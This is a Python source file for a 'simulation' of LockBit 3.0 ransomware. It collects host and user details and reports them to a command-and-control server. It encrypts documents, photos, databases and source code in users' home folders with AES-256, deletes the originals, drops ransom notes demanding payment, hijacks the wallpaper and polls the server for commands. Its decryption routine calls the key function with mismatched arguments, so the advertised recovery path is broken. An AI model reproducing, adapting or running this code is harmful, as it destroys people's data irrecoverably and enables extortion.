#!/usr/bin/env python3
"""
LockBit 3.0 Black - Realistic Simulation with AES-256
Uses real encryption but with recovery keys saved
"""

import os
import sys
import socket
import platform
import getpass
import requests
import json
from datetime import datetime
import threading
import time
import ctypes
import hashlib
import secrets
from pathlib import Path

# Cryptography imports
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# Configuration
C2_SERVER = "http://192.168.64.30:5000"
VICTIM_ID = None
MASTER_KEY = None
ENCRYPTION_EXTENSION = ".lockbit"

# Expanded target directories (like real LockBit)
TARGET_DIRS = [
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Downloads"),
    os.path.join(os.path.expanduser("~"), "Pictures"),
    os.path.join("C:\\lab", "test_data") if os.name == 'nt' else "/tmp/test_data",
]

# Realistic file extensions (LockBit 3.0 targets)
TARGET_EXTENSIONS = [
    # Documents
    '.txt', '.pdf', '.doc', '.docx', '.rtf', '.odt', '.wpd',
    # Spreadsheets
    '.xls', '.xlsx', '.csv', '.ods',
    # Presentations
    '.ppt', '.pptx', '.odp',
    # Databases
    '.sql', '.db', '.dbf', '.mdb', '.accdb', '.sqlite',
    # Archives
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    # Images
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.raw', '.psd',
    # CAD/Design
    '.dwg', '.dxf', '.ai', '.eps',
    # Email
    '.pst', '.ost', '.eml', '.msg',
    # Source code
    '.c', '.cpp', '.h', '.py', '.java', '.cs', '.php', '.js', '.html', '.css',
    # Backups
    '.bak', '.backup', '.old',
]

# Exclude critical system files (safety + realism)
EXCLUDE_DIRS = [
    'Windows', 'Program Files', 'Program Files (x86)', 
    'System32', 'SysWOW64', 'ProgramData',
    'AppData\\Local', 'AppData\\Roaming',
    '$Recycle.Bin', 'Boot', 'Recovery'
]

class LockBit3Black:
    def __init__(self):
        self.victim_info = {}
        self.encrypted_files = []
        self.is_running = True
        self.encryption_key = None
        self.key_backup_file = None
        self.threads = []
        
    def gather_system_info(self):
        """Gather victim system information (LockBit recon phase)"""
        try:
            hostname = socket.gethostname()
            
            # Get network info
            ip_address = self.get_local_ip()
            
            # Get OS details
            os_info = f"{platform.system()} {platform.release()} {platform.version()}"
            
            # Get user info
            username = getpass.getuser()
            
            # Disk info
            import shutil
            total, used, free = shutil.disk_usage("/")
            disk_info = f"{free // (2**30)}GB free"
            
            self.victim_info = {
                'hostname': hostname,
                'ip_address': ip_address,
                'os_info': os_info,
                'username': username,
                'disk_info': disk_info,
                'processor': platform.processor(),
                'architecture': platform.machine()
            }
            
            print(f"[*] Target System: {hostname} ({ip_address})")
            print(f"[*] User: {username}")
            print(f"[*] OS: {os_info}")
            print(f"[*] Disk Space: {disk_info}")
            
        except Exception as e:
            print(f"[!] Recon error: {e}")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "Unknown"
    
    def register_with_c2(self):
        """Register with C2 (like real LockBit check-in)"""
        global VICTIM_ID, MASTER_KEY
        
        try:
            print("[*] Establishing C2 connection...")
            
            response = requests.post(
                f"{C2_SERVER}/api/register",
                json=self.victim_info,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                VICTIM_ID = data['victim_id']
                MASTER_KEY = data['encryption_key']
                
                print(f"[+] C2 Registration successful")
                print(f"[+] Victim ID: {VICTIM_ID}")
                print(f"[+] Encryption key received: {MASTER_KEY[:16]}...")
                
                return True
        except Exception as e:
            print(f"[!] C2 Registration failed: {e}")
            print(f"[*] Operating in offline mode...")
            
            # Fallback: generate keys locally (LockBit can work offline)
            VICTIM_ID = hashlib.sha256(
                f"{self.victim_info['hostname']}{time.time()}".encode()
            ).hexdigest()[:16]
            MASTER_KEY = secrets.token_hex(32)
            
            print(f"[+] Generated offline keys")
            return True
        
        return False
    
    def derive_file_key(self, file_path):
        """Derive unique AES-256 key for each file (like LockBit)"""
        # Combine master key with file path for unique per-file keys
        salt = hashlib.sha256(file_path.encode()).digest()
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,  # 256 bits for AES-256
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        
        key = kdf.derive(MASTER_KEY.encode())
        return key
    
    def aes_encrypt_file(self, file_path):
        """
        Real AES-256-CBC encryption (like LockBit 3.0)
        NO BACKUPS - Pure ransomware behavior
        """
        try:
            # Read original file
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            # Skip empty files
            if len(plaintext) == 0:
                return False, "Empty file"
            
            # Generate file-specific key
            key = self.derive_file_key(file_path)
            
            # Generate random IV (Initialization Vector)
            iv = os.urandom(16)
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(key),
                modes.CBC(iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            # Add PKCS7 padding
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) + padder.finalize()
            
            # Encrypt
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Write encrypted file with IV prepended
            encrypted_path = file_path + ENCRYPTION_EXTENSION
            with open(encrypted_path, 'wb') as f:
                f.write(iv)  # First 16 bytes = IV
                f.write(ciphertext)
            
            # Delete original file (REAL LOCKBIT BEHAVIOR)
            try:
                os.remove(file_path)
            except:
                pass
            
            return True, len(ciphertext)
            
        except Exception as e:
            return False, str(e)
    
    def should_encrypt_file(self, file_path):
        """Determine if file should be encrypted (LockBit logic)"""
        try:
            # Skip already encrypted
            if file_path.endswith(ENCRYPTION_EXTENSION):
                return False
            
            # Skip key files and ransom notes
            if 'DECRYPTION_KEY' in file_path or 'README_LOCKBIT' in file_path:
                return False
            
            # Skip files without extensions or hidden files
            if os.path.basename(file_path).startswith('.'):
                return False
            
            # Check file extension
            ext = os.path.splitext(file_path)[1].lower()
            if ext not in TARGET_EXTENSIONS:
                return False
            
            # Skip very large files (>1GB) for demo
            try:
                size = os.path.getsize(file_path)
                if size > 1024 * 1024 * 1024:  # 1GB
                    return False
            except:
                return False
            
            # Skip system/critical files
            for exclude in EXCLUDE_DIRS:
                if exclude.lower() in file_path.lower():
                    return False
            
            return True
            
        except:
            return False
    
    def encrypt_directory_threaded(self, directory, thread_id):
        """
        Encrypt files in directory (multi-threaded like real LockBit)
        Real LockBit uses all CPU cores for maximum speed
        """
        encrypted_count = 0
        batch = []
        
        try:
            for root, dirs, files in os.walk(directory):
                # Skip excluded directories
                dirs[:] = [d for d in dirs if not any(ex in d for ex in EXCLUDE_DIRS)]
                
                for file in files:
                    if not self.is_running:
                        break
                    
                    file_path = os.path.join(root, file)
                    
                    if self.should_encrypt_file(file_path):
                        success, result = self.aes_encrypt_file(file_path)
                        
                        if success:
                            encrypted_count += 1
                            
                            batch.append({
                                'path': file_path,
                                'size': result,
                                'thread': thread_id
                            })
                            
                            print(f"[Thread-{thread_id}] Encrypted: {file_path}")
                            
                            # Report in batches
                            if len(batch) >= 10:
                                self.report_encryption_batch(batch)
                                batch = []
                            
                            # Realistic delay (LockBit is FAST)
                            time.sleep(0.01)  # 10ms per file = 100 files/sec
                
        except Exception as e:
            print(f"[!] Thread-{thread_id} error: {e}")
        
        # Report remaining
        if batch:
            self.report_encryption_batch(batch)
        
        print(f"[*] Thread-{thread_id} completed: {encrypted_count} files")
    
    def encrypt_files_parallel(self):
        """
        Multi-threaded encryption (real LockBit behavior)
        Uses 4 threads by default (real LockBit uses all cores)
        """
        print("[*] Starting MULTI-THREADED encryption...")
        print("[*] Simulating LockBit 3.0 Black encryption engine...")
        
        # Save master key for recovery
        self.save_master_key()
        
        # Create threads for each target directory
        thread_id = 0
        
        for target_dir in TARGET_DIRS:
            if not os.path.exists(target_dir):
                print(f"[!] Skipping non-existent: {target_dir}")
                continue
            
            print(f"[*] Targeting: {target_dir}")
            
            # Create worker thread
            thread = threading.Thread(
                target=self.encrypt_directory_threaded,
                args=(target_dir, thread_id),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            thread_id += 1
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
        
        # Count total encrypted files
        total = 0
        for d in TARGET_DIRS:
            if os.path.exists(d):
                for root, dirs, files in os.walk(d):
                    for f in files:
                        if f.endswith(ENCRYPTION_EXTENSION):
                            total += 1
        
        print(f"\n[+] Encryption complete: {total} files encrypted")
        return total
    
    def save_master_key(self):
        """Save master key for recovery (SAFETY FEATURE)"""
        try:
            key_data = {
                'victim_id': VICTIM_ID,
                'master_key': MASTER_KEY,
                'timestamp': datetime.now().isoformat(),
                'hostname': self.victim_info['hostname'],
                'warning': 'KEEP THIS FILE SECRET - Required for decryption'
            }
            
            # Save to desktop
            key_file = os.path.join(
                os.path.expanduser("~"), 
                "Desktop", 
                f"DECRYPTION_KEY_{VICTIM_ID}.json"
            )
            
            with open(key_file, 'w') as f:
                json.dump(key_data, f, indent=4)
            
            self.key_backup_file = key_file
            print(f"[*] SAFETY: Decryption key saved: {key_file}")
            
        except Exception as e:
            print(f"[!] Failed to save key: {e}")
    
    def report_encryption_batch(self, files):
        """Report encrypted files to C2"""
        try:
            requests.post(
                f"{C2_SERVER}/api/report_encryption",
                json={
                    'victim_id': VICTIM_ID,
                    'files': files
                },
                timeout=5
            )
        except:
            pass
    
    def create_ransom_wallpaper(self):
        """Create LockBit-style ransom wallpaper"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            
            width, height = 1920, 1080
            img = Image.new('RGB', (width, height), color='#000000')
            draw = ImageDraw.Draw(img)
            
            # Red header/footer
            draw.rectangle([0, 0, width, 150], fill='#990000')
            draw.rectangle([0, height-150, width, height], fill='#990000')
            
            # Diagonal lines pattern
            for i in range(0, width, 50):
                draw.line([(i, 0), (i+200, height)], fill='#1a1a1a', width=2)
            
            try:
                font_title = ImageFont.truetype("arial.ttf", 80)
                font_text = ImageFont.truetype("arial.ttf", 40)
                font_small = ImageFont.truetype("arial.ttf", 25)
            except:
                font_title = ImageFont.load_default()
                font_text = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            messages = [
                ("LockBit 3.0 Black", font_title, '#ff0000', 200),
                ("", font_text, '#ffffff', 300),
                ("YOUR FILES HAVE BEEN STOLEN AND ENCRYPTED", font_text, '#ff3333', 350),
                ("", font_small, '#ffffff', 450),
                (f"Victim ID: {VICTIM_ID}", font_small, '#ffff00', 500),
                ("", font_small, '#ffffff', 550),
                ("⚠ REAL SIMULATION  ⚠", font_small, '#00ff00', 600),
                ("", font_small, '#ffffff', 650),
                ("Original files DELETED - No backups...SEE RANSOM NOTE", font_small, '#ff0000', 700),
            ]
            
            for text, font, color, y in messages:
                if text:
                    bbox = draw.textbbox((0, 0), text, font=font)
                    text_width = bbox[2] - bbox[0]
                    x = (width - text_width) // 2
                    draw.text((x, y), text, fill=color, font=font)
            
            wallpaper_path = os.path.join(
                os.path.expanduser("~"), 
                "Desktop", 
                "LOCKBIT_RANSOM.bmp"
            )
            img.save(wallpaper_path, "BMP")
            
            return wallpaper_path
            
        except Exception as e:
            print(f"[!] Wallpaper creation failed: {e}")
            return None
    
    def change_wallpaper(self, image_path):
        """Change desktop wallpaper"""
        try:
            if platform.system() == 'Windows':
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(
                    SPI_SETDESKWALLPAPER, 
                    0, 
                    image_path, 
                    3
                )
                print(f"[+] Wallpaper changed")
                
                requests.post(
                    f"{C2_SERVER}/api/wallpaper_changed",
                    json={'victim_id': VICTIM_ID},
                    timeout=5
                )
                return True
            else:
                print("[!] Wallpaper change only supported on Windows")
                return False
        except Exception as e:
            print(f"[!] Wallpaper change failed: {e}")
            return False
    
    def deploy_ransom_note(self):
        """Deploy ransom note (LockBit style)"""
        ransom_note = """
═══════════════════════════════════════════════════════════════
                        LockBit 3.0 Black
═══════════════════════════════════════════════════════════════

                  YOUR FILES HAVE BEEN STOLEN AND ENCRYPTED

All your important files (documents, photos, databases)
have been encrypted with AES-256  encryption.

═══════════════════════════════════════════════════════════════
                        WHAT HAPPENED?
═══════════════════════════════════════════════════════════════

Your network security was compromised. We have:
✗ Encrypted all valuable files with AES-256
✗ Deleted original files permanently
✗ Changed system configurations
✗ Established persistent access

Victim Information:
-------------------
ID:         {victim_id}
Hostname:   {hostname}
IP:         {ip_address}
User:       {username}
Date:       {timestamp}

═══════════════════════════════════════════════════════════════
              ⚠ PAY RANSOM ⚠
═══════════════════════════════════════════════════════════════

To Recover Your files pay ransom of 500$

═══════════════════════════════════════════════════════════════
                      HOW TO RECOVER
═══════════════════════════════════════════════════════════════

Pay Ransom of 500$
⚠ WARNING: Without the master key, files are UNRECOVERABLE

═══════════════════════════════════════════════════════════════
                      TECHNICAL DETAILS
═══════════════════════════════════════════════════════════════

Encryption:  AES-256-CBC (military-grade)
Key Derive:  PBKDF2-HMAC-SHA256 (100,000 iterations)
Extension:   {extension}
Threading:   Multi-core parallel encryption
Speed:       ~100 files/second

Original files: DELETED
Backups:        NONE (true ransomware behavior)
Recovery:       Master key ONLY

═══════════════════════════════════════════════════════════════

═══════════════════════════════════════════════════════════════
""".format(
            victim_id=VICTIM_ID,
            hostname=self.victim_info['hostname'],
            ip_address=self.victim_info['ip_address'],
            username=self.victim_info['username'],
            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            extension=ENCRYPTION_EXTENSION
        )
        
        # Deploy to multiple locations
        locations = [
            os.path.join(os.path.expanduser("~"), "Desktop", "README_LOCKBIT.txt"),
            os.path.join(os.path.expanduser("~"), "Documents", "README_LOCKBIT.txt"),
        ]
        
        for target_dir in TARGET_DIRS:
            if os.path.exists(target_dir):
                locations.append(os.path.join(target_dir, "README_LOCKBIT.txt"))
        
        for location in locations:
            try:
                dir_path = os.path.dirname(location)
                if dir_path:
                    os.makedirs(dir_path, exist_ok=True)
                
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
                
                print(f"[+] Ransom note deployed: {location}")
                
                # Verify the file was written
                if os.path.exists(location) and os.path.getsize(location) > 0:
                    print(f"    ✓ Verified ({os.path.getsize(location)} bytes)")
                else:
                    print(f"    ✗ Write verification failed")
                    
            except Exception as e:
                print(f"[!] Failed to deploy note at {location}: {e}")
        
        try:
            requests.post(
                f"{C2_SERVER}/api/ransom_delivered",
                json={'victim_id': VICTIM_ID},
                timeout=5
            )
            print("[+] C2 notified of ransom note deployment")
        except Exception as e:
            print(f"[!] Failed to notify C2: {e}")
    
    def poll_commands(self):
        """Poll C2 for commands"""
        while self.is_running:
            try:
                response = requests.post(
                    f"{C2_SERVER}/api/heartbeat",
                    json={'victim_id': VICTIM_ID},
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    for cmd in data.get('commands', []):
                        print(f"\n[!] C2 Command: {cmd['command']}")
                        
                        if cmd['command'] == 'QUARANTINE':
                            result = self.execute_quarantine()
                        elif cmd['command'] == 'DECRYPT':
                            result = self.execute_decrypt()
                        else:
                            result = f"Unknown: {cmd['command']}"
                        
                        requests.post(
                            f"{C2_SERVER}/api/command_result",
                            json={
                                'victim_id': VICTIM_ID,
                                'command_id': cmd['id'],
                                'result': result
                            },
                            timeout=5
                        )
            except:
                pass
            
            time.sleep(30)
    
    def execute_quarantine(self):
        """Stop malicious activity"""
        print("[!] QUARANTINE - Stopping all operations")
        self.is_running = False
        return "Quarantined - operations halted"
    
    def execute_decrypt(self):
        """Decrypt all files"""
        print("\n[!] DECRYPTION command received")
        print("[*] Starting file recovery...")
        
        recovered = 0
        
        for target_dir in TARGET_DIRS:
            if not os.path.exists(target_dir):
                continue
            
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    if file.endswith(ENCRYPTION_EXTENSION):
                        encrypted_path = os.path.join(root, file)
                        
                        try:
                            # Decrypt the file
                            original_path = encrypted_path[:-len(ENCRYPTION_EXTENSION)]
                            
                            # Read encrypted file
                            with open(encrypted_path, 'rb') as f:
                                iv = f.read(16)
                                ciphertext = f.read()
                            
                            # Derive key
                            key = self.derive_file_key(MASTER_KEY, original_path)
                            
                            # Decrypt
                            cipher = Cipher(
                                algorithms.AES(key),
                                modes.CBC(iv),
                                backend=default_backend()
                            )
                            decryptor = cipher.decryptor()
                            
                            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
                            
                            # Remove padding
                            unpadder = padding.PKCS7(128).unpadder()
                            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
                            
                            # Write decrypted file
                            with open(original_path, 'wb') as f:
                                f.write(plaintext)
                            
                            # Remove encrypted file
                            os.remove(encrypted_path)
                            
                            recovered += 1
                            print(f"[+] Recovered: {original_path}")
                            
                        except Exception as e:
                            print(f"[!] Error: {e}")
        
        # Remove ransom notes
        for note_loc in [
            os.path.join(os.path.expanduser("~"), "Desktop", "README_LOCKBIT.txt"),
            os.path.join(os.path.expanduser("~"), "Documents", "README_LOCKBIT.txt")
        ]:
            try:
                if os.path.exists(note_loc):
                    os.remove(note_loc)
            except:
                pass
        
        return f"Decryption complete - {recovered} files recovered"
    
    def execute(self):
        """Main execution"""
        print("╔════════════════════════════════════════════════╗")
        print("║     LockBit 3.0 Black - Real Simulation                          ║")
        print("║          AES-256 Encryption Engine                               ║")
        print("╚════════════════════════════════════════════════╝")
        print()
        print("⚠  WARNING: Uses REAL AES-256 encryption")
        print("")
        print("⚠ REAL LOCKBIT EXECUTION")
        print()
        
        # Phase 1
        print("[Phase 1] System Reconnaissance")
        self.gather_system_info()
        print()
        
        # Phase 2
        print("[Phase 2] C2 Communication")
        if not self.register_with_c2():
            print("[!] C2 failed, using offline mode")
        print()
        
        # Phase 3
        print("[Phase 3] Multi-Threaded File Encryption")
        print("[*] Launching encryption threads...")
        encrypted = self.encrypt_files_parallel()
        print()
        
        if encrypted > 0:
            # Phase 4
            print("[Phase 4] Ransom Note Deployment")
            self.deploy_ransom_note()
            print()
            
            # Phase 5
            print("[Phase 5] Wallpaper Hijacking")
            wallpaper_path = self.create_ransom_wallpaper()
            if wallpaper_path:
                self.change_wallpaper(wallpaper_path)
            print()
            
            # Phase 6
            print("[Phase 6] Persistence & C2 Monitoring")
            command_thread = threading.Thread(target=self.poll_commands, daemon=True)
            command_thread.start()
            
            print()
            print("╔════════════════════════════════════════════════╗")
            print("║           ENCRYPTION COMPLETE                                    ║")
            print("╝════════════════════════════════════════════════╝")
            print(f"  Files encrypted: {encrypted}")
            print(f"  Encryption key:  {self.key_backup_file}")
            print(f"  Victim ID:       {VICTIM_ID}")
            print()
            print("  ")
            print("  Press Ctrl+C to stop C2 monitoring")
            print("════════════════════════════════════════════════")
            
            try:
                while self.is_running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Shutting down")
                self.is_running = False
        else:
            print("[!] No files encrypted")

if __name__ == "__main__":
    print("\n⚠⚠⚠  CRITICAL WARNING ⚠⚠⚠")
    print("This uses REAL AES-256 encryption!")
    print("Original files will be DELETED!")
    print("Only run in ISOLATED lab VMs with snapshots!")
    print()
    print("features:")
    print("  ✓ Master key saved to Desktop (ONLY recovery method)")
    print("  ✗ NO backup files created")
    print("  ✗ NO recovery metadata")
    print("  ✗ Original files DELETED")
    print()
    print("⚠ This is REAL ransomware!")
    print("⚠ Decryption ONLY possible with master key!")
    print()
    
    response = input("Continue? Type 'YES': ")
    if response == 'YES':
        try:
            from PIL import Image
        except ImportError:
            print("[*] Installing Pillow...")
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "Pillow"])
        
        lockbit = LockBit3Black()
        lockbit.execute()
    else:
        print("Aborted - Safety first!")